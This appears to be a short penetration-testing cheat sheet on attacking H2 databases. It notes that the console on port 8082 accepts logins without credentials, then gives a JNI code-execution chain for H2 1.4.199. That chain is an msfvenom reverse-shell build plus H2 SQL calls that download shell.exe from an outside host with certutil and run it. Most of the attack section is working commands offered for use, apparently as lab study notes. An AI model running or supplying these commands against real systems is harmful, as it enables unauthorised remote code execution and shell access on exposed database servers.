## Enumeration 
#### banner grabbing 
```bash
8082 - login for H2 database
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/a4bcd349-f6b1-48e4-9d9d-ea390c2f7d85)

Connect w/o credentials 
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/cec18523-acb3-4e84-a31d-380adaafeb94)

![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/f058c5cb-fa2f-4770-a617-02987ce659c8)

<br> 
<br> 

## Attacking H2 databases 
#### H2 1.4.199 - JNI code execution 
```bash 
# https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html
# https://www.exploit-db.com/raw/49384
```
PoC - whoami 
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/bf17fab7-8a87-428f-aa26-04857367642f)

Code execution -
```bash
# msfvenom 
sudo msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.49.124 lport=443 -f exe -o shell.exe

# serve & download file
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.10.10/shell.exe C:\\Windows\\Temp\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');

# execute shell.exe 
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c C:\\Windows\\temp\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/fef643a8-477c-413b-bf5e-03ca17a57907)
